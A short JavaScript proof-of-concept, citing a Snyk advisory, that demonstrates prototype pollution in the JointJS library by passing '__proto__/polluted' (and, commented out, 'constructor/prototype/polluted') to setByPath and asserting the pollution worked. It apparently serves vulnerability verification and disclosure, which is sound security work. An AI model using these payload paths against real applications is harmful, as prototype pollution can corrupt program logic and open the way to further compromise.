//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
const jointjs = require("jointjs");
const { assert } = require("@firebase/util");

const obj = {};
console.log("Before : " + obj.polluted);
jointjs.util.setByPath({ }, '__proto__/polluted', "yes", '/');
// jointjs.util.setByPath({ }, 'constructor/prototype/polluted', "yes", '/');
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");